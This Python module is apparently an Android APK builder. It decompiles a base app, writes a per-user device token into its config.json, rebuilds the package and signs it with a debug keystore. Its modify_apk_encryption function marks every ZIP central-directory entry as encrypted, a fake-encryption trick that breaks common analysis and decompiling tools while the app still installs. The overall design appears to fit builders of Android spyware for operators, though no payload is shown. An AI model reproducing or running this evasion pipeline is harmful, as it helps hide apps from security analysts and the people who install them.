import os
import json
import struct
import shutil
import asyncio
import logging
import subprocess
import time
from .config import (
    APKTOOL_JAR, APKSIGNER_PATH, ZIPALIGN_PATH,
    DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
)
from .utils import read_file, write_file, cleanup_old_builds
from .keystore_generator import create_temp_keystore, cleanup_keystore

logger = logging.getLogger(__name__)


def modify_apk_encryption(input_apk, output_apk):
    try:
        logger.info(f"Modifying BitFlag: {input_apk}")
        
        with open(input_apk, 'rb') as f:
            data = f.read()
        
        eocd_sig = b'\x50\x4B\x05\x06'
        eocd_offset = data.rfind(eocd_sig)
        if eocd_offset == -1:
            logger.error("EOCD not found")
            return False
        
        cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
        cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
        
        pos = cd_offset
        modified = bytearray(data)
        count = 0
        
        while pos < cd_offset + cd_size:
            if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                break
            
            bitflag_offset = pos + 8
            bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
            
            if not (bitflag & 0x0001):
                bitflag |= 0x0001
                struct.pack_into('<H', modified, bitflag_offset, bitflag)
                count += 1
            
            name_len = struct.unpack_from('<H', data, pos + 28)[0]
            extra_len = struct.unpack_from('<H', data, pos + 30)[0]
            comment_len = struct.unpack_from('<H', data, pos + 32)[0]
            pos += 46 + name_len + extra_len + comment_len
        
        with open(output_apk, 'wb') as f:
            f.write(modified)
        
        logger.info(f"✅ Modified {count} entries")
        return True
        
    except Exception as e:
        logger.error(f"Error modifying BitFlag: {str(e)}")
        return False


def zipalign_apk(input_apk, output_apk):
    try:
        logger.info(f"Running zipalign: {input_apk}")
        
        if not os.path.exists(ZIPALIGN_PATH):
            logger.error(f"zipalign not found: {ZIPALIGN_PATH}")
            return False
        
        if os.path.exists(output_apk):
            os.remove(output_apk)
        
        cmd = [ZIPALIGN_PATH, "-p", "-f", "-v", "4", input_apk, output_apk]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            logger.error(f"zipalign error: {result.stderr}")
            return False
        
        if not os.path.exists(output_apk):
            logger.error(f"Zipaligned APK not created: {output_apk}")
            return False
        
        logger.info("✅ zipalign done")
        return True
        
    except Exception as e:
        logger.error(f"zipalign exception: {str(e)}")
        return False


def sign_apk(input_apk, output_apk, keystore_path=None, password=None, alias=None):
    """
    Sign APK with keystore
    If keystore_path is None, creates a temporary keystore with 'suzi' alias
    """
    temp_keystore = None
    
    try:
        logger.info(f"Signing APK: {input_apk}")
        
        if not os.path.exists(APKSIGNER_PATH):
            logger.error(f"apksigner not found: {APKSIGNER_PATH}")
            return None
        
        if not os.path.exists(input_apk):
            logger.error(f"Input APK not found: {input_apk}")
            return None
        
        # If no keystore provided, create temporary one
        if keystore_path is None or not os.path.exists(keystore_path):
            logger.info("🔑 Creating temporary keystore (suzi)...")
            keystore_path, password, alias = create_temp_keystore(alias='suzi')
            
            if not keystore_path:
                logger.error("Failed to create temporary keystore")
                return None
            
            temp_keystore = keystore_path
            logger.info(f"✅ Temporary keystore created")
        
        if os.path.exists(output_apk):
            os.remove(output_apk)
        
        cmd = [
            APKSIGNER_PATH, "sign",
            "--ks", keystore_path,
            "--ks-pass", f"pass:{password}",
            "--ks-key-alias", alias,
            "--key-pass", f"pass:{password}",
            "--v1-signing-enabled", "true",
            "--v2-signing-enabled", "true",
            "--v3-signing-enabled", "true",
            "--v4-signing-enabled", "false",
            "--out", output_apk,
            input_apk
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            logger.error(f"Signing failed: {result.stderr}")
            return None
        
        if not os.path.exists(output_apk):
            logger.error(f"Signed APK not found: {output_apk}")
            return None
        
        logger.info(f"✅ Signed successfully")
        return output_apk
            
    except Exception as e:
        logger.error(f"Error signing: {str(e)}", exc_info=True)
        return None
    finally:
        # Cleanup temp keystore if created
        if temp_keystore:
            cleanup_keystore(temp_keystore)


def verify_apk_signature(apk_path):
    try:
        logger.info(f"Verifying signature: {apk_path}")
        
        result = subprocess.run([
            APKSIGNER_PATH, "verify",
            "--verbose",
            apk_path
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("✅ Signature verified")
            return True
        else:
            logger.warning(f"Signature verification warning: {result.stderr}")
            return False
            
    except Exception as e:
        logger.error(f"Error verifying: {str(e)}")
        return False


async def build_apk(user_id, device_token, base_apk_path, custom_theme=None, app_type=None):
    output_dir = None
    output_apk = None
    modified_apk = None
    aligned_apk = None
    final_apk = None
    
    try:
        logger.info(f"Starting APK build for user {user_id}")
        logger.info(f"Base APK: {base_apk_path}")
        if custom_theme:
            logger.info("Building with custom theme")
        if app_type:
            logger.info(f"App type: {app_type}")
        logger.info("=" * 60)
        logger.info("PROCESS: Decompile → Edit → Rebuild → BitFlag → Zipalign → Sign")
        logger.info("=" * 60)
        
        timestamp = int(time.time())
        output_dir = f"builds/user_{user_id}_{timestamp}"
        output_apk = f"builds/app_{user_id}_{timestamp}.apk"
        modified_apk = f"builds/app_{user_id}_{timestamp}_modified.apk"
        aligned_apk = f"builds/app_{user_id}_{timestamp}_aligned.apk"
        final_apk = f"builds/app_{user_id}_{timestamp}_final.apk"
        
        os.makedirs('builds', exist_ok=True)
        await asyncio.to_thread(cleanup_old_builds, user_id)
        
        logger.info("STEP 1: Decompiling...")
        process = await asyncio.create_subprocess_exec(
            'java', '-jar', APKTOOL_JAR,
            'd', base_apk_path,
            '-o', output_dir,
            '-f', '-s',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode != 0:
            logger.error(f"Decompile failed: {stderr.decode()}")
            return False, f"Decompile failed"
        
        logger.info("✅ Decompile done")
        
        logger.info("STEP 2: Editing config.json...")
        config_file = f'{output_dir}/assets/config.json'
        
        if not await asyncio.to_thread(os.path.exists, config_file):
            logger.error(f"config.json not found: {config_file}")
            return False, "config.json not found"
        
        config_content = await asyncio.to_thread(read_file, config_file)
        
        try:
            config_data = json.loads(config_content)
            logger.info(f"Original user_id: {config_data.get('user_id')}")
            
            config_data['user_id'] = device_token
            logger.info(f"New user_id: {device_token}")
            
            # Apply custom app_type if provided
            if app_type:
                logger.info(f"Applying custom app_type: {app_type}")
                config_data['app_type'] = app_type
                logger.info("✅ App type applied")
            
            # Apply custom theme if provided
            if custom_theme:
                logger.info("Applying custom theme...")
                if 'theme' not in config_data:
                    config_data['theme'] = {}
                config_data['theme'].update(custom_theme)
                logger.info(f"✅ Custom theme applied with {len(custom_theme)} colors")
            
            new_config_content = json.dumps(config_data, indent=2, ensure_ascii=False)
            await asyncio.to_thread(write_file, config_file, new_config_content)
            logger.info("✅ config.json updated")
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON error: {str(e)}")
            return False, f"Invalid JSON: {str(e)}"
        
        logger.info("STEP 3: Rebuilding...")
        process = await asyncio.create_subprocess_exec(
            'java', '-jar', APKTOOL_JAR,
            'b', output_dir,
            '-o', output_apk,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        if process.returncode != 0:
            logger.error(f"Rebuild failed: {stderr.decode()}")
            return False, f"Rebuild failed"
        
        logger.info("✅ Rebuild done")
        
        if not await asyncio.to_thread(os.path.exists, output_apk):
            logger.error(f"APK not found: {output_apk}")
            return False, "APK not created"
        
        logger.info("STEP 4: Modifying BitFlag...")
        if not await asyncio.to_thread(modify_apk_encryption, output_apk, modified_apk):
            logger.error("BitFlag failed")
            return False, "BitFlag modification failed"
        
        logger.info("✅ BitFlag done")
        
        logger.info("STEP 5: Running zipalign...")
        if not await asyncio.to_thread(zipalign_apk, modified_apk, aligned_apk):
            logger.error("zipalign failed")
            return False, "zipalign failed"
        
        if not await asyncio.to_thread(os.path.exists, aligned_apk):
            logger.error(f"Aligned APK not found: {aligned_apk}")
            return False, "Aligned APK not created"
        
        logger.info("✅ zipalign done")
        
        logger.info("STEP 6: Finding debug keystore...")
        keystore_path = None
        for path in DEBUG_KEYSTORE_PATHS:
            if await asyncio.to_thread(os.path.exists, path):
                keystore_path = path
                logger.info(f"✅ Found debug keystore: {path}")
                break
        
        if keystore_path is None:
            logger.error("Debug keystore not found")
            return False, "Debug keystore not found. Please run Android Studio once."
        
        password = DEBUG_KEYSTORE_PASSWORD
        alias = DEBUG_KEYSTORE_ALIAS
        
        logger.info("STEP 7: Signing APK...")
        sign_result = await asyncio.to_thread(sign_apk, aligned_apk, final_apk, keystore_path, password, alias)
        
        if sign_result is None:
            logger.error("Signing failed")
            return False, "Signing failed"
        
        if not await asyncio.to_thread(os.path.exists, final_apk):
            logger.error(f"Signed APK not found: {final_apk}")
            return False, "Signed APK not created"
        
        logger.info("✅ Signing done")
        
        logger.info("STEP 8: Verifying signature...")
        is_verified = await asyncio.to_thread(verify_apk_signature, final_apk)
        
        if not is_verified:
            logger.warning("Verification warning (but APK should still work)")
        else:
            logger.info("✅ Verification passed")
        
        logger.info(f"✅ FINAL APK: {final_apk}")
        logger.info("=" * 60)
        
        return True, final_apk
        
    except Exception as e:
        logger.error(f"Build error: {str(e)}", exc_info=True)
        return False, f"Error: {str(e)}"
    
    finally:
        logger.info("Cleaning up temp files...")
        
        temp_files = [output_dir, output_apk, modified_apk, aligned_apk]
        
        for temp_file in temp_files:
            if temp_file and await asyncio.to_thread(os.path.exists, temp_file):
                try:
                    if os.path.isdir(temp_file):
                        await asyncio.to_thread(shutil.rmtree, temp_file)
                    else:
                        await asyncio.to_thread(os.remove, temp_file)
                    logger.info(f"Removed: {temp_file}")
                except Exception as e:
                    logger.warning(f"Could not remove {temp_file}: {e}")
